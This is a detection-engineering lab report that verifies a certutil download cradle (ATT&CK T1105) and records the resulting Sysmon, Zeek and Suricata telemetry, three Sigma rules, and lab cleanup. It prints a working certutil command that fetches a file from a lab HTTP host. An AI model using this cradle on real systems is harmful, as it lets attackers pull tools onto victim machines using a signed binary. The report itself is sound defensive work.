# Certutil remote-download verification

This run verified a signed-binary download cradle for **Ingress Tool Transfer
(T1105)**. Kali VM 100 served a 3,768-byte, explicitly benign text fixture over
lab-only HTTP. Windows VM 104 started from `win_verify_baseline`; Defender
real-time protection was off and Sysmon 15.21 was running with verification
config SHA-256
`5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71`.

The built-in, validly Microsoft-signed `certutil.exe` was invoked from
`C:\lab` as `NT AUTHORITY\SYSTEM`:

```text
certutil.exe -urlcache -split -f http://192.168.1.50:18080/benign-stage.bin C:\lab\downloaded.bin
```

The measured invocation ran from `2026-08-09T23:07:12.2950827Z` through
`2026-08-09T23:07:12.3573775Z`, returned exit code 0, and produced a 3,768-byte
file. Its SHA-256 matched the staged source:
`92EE1BBE6EE3B6CC7CD6ED720B594C6C3394D362838DB8C02C6CA6732E94F86A`.

## Observed telemetry

| Dimension | Observation |
|---|---|
| Process | Sysmon EID 1 recorded `certutil.exe`, `OriginalFileName=CertUtil.exe`, all three download flags, the HTTP URL, SYSTEM integrity, and the built-in binary hash. |
| Network | Two Sysmon EID 3 TCP connections reached `192.168.1.50:18080`; EID 22 was absent because the command used an IP literal. Zeek decoded two successful GETs for `/benign-stage.bin`, with User-Agents `Microsoft-CryptoAPI/10.0` and `CertUtil URL Agent`. |
| File | Five certutil-attributed EID 11 events recorded CryptnetUrlCache metadata/content, an INetCache copy, a SHA-1-named `.key` file, and `C:\lab\downloaded.bin`. EID 23 recorded deletion of the transient INetCache copy and its matching SHA-256. |
| Registry | Fourteen EID 12 and fourteen EID 13 events showed cryptography OID and Internet Settings/cache initialization; no EID 14 appeared. These targets are normal API state and not distinctive enough for a standalone rule. |
| Parent-child | The EID 1 event linked certutil to `powershell.exe`, which ran the controlled lab wrapper as SYSTEM. |

The full-packet pktmon capture covered
`2026-08-09T23:07:11.4823786Z`–`2026-08-09T23:07:13.7948783Z`. Offline NSM on
VM 106 analyzed 132 packets with Zeek 8.2.1 and Suricata 7.0.10; Zeek reported
zero capture loss and hashed both HTTP response bodies to the expected fixture
SHA-256. Suricata independently decoded both requests and User-Agent values.
Its alerts were limited to the expected Python SimpleHTTP server banner and
pktmon checksum/retransmission artifacts.

## Sigma detections

| Tier | Logsource | Rule | Role |
|---|---|---|---|
| 1 | `windows/process_creation` | `win_process_creation_certutil_remote_download.yml` | Primary: certutil identity, all download flags, HTTP(S) URL, and command/script-interpreter parent context. |
| 1 | `zeek/http` | `network_zeek_certutil_cryptoapi_user_agent.yml` | Network: GET with a `Microsoft-CryptoAPI/` User-Agent; no lab address or port is embedded. |
| 1 | `windows/sysmon/file_event` | `win_file_event_certutil_urlcache_content.yml` | Supporting file signal: certutil writes CryptnetUrlCache content. |

All three rules are behavior-based and experimental. Legitimate certificate,
CRL, trust-list, enrollment, and troubleshooting activity can use certutil or
CryptoAPI, so the process rule is the higher-confidence primary and the network
and file rules are valuable correlation signals.

## Evidence handling and cleanup

Only selected telemetry fields and aggregate counts are committed in
`evidence/`. The raw PCAP, EVTX files, combined event export, and NSM working
logs remained in a transient directory outside the repository and are not part
of this change.

After analysis, the Kali HTTP systemd unit was stopped, its dedicated served
directory was removed, and no listener remained on port 18080. VM 104 was
stopped, rolled back to `win_verify_baseline`, and restarted. The lab script,
downloaded file, packet capture, and telemetry directory were absent after
rollback; Sysmon returned to `Running` with the expected configuration hash and
Defender real-time protection remained off.

See [LOLBAS Certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/),
[ATT&CK T1105](https://attack.mitre.org/techniques/T1105/), and
[ATT&CK T1140](https://attack.mitre.org/techniques/T1140/) for related use cases.
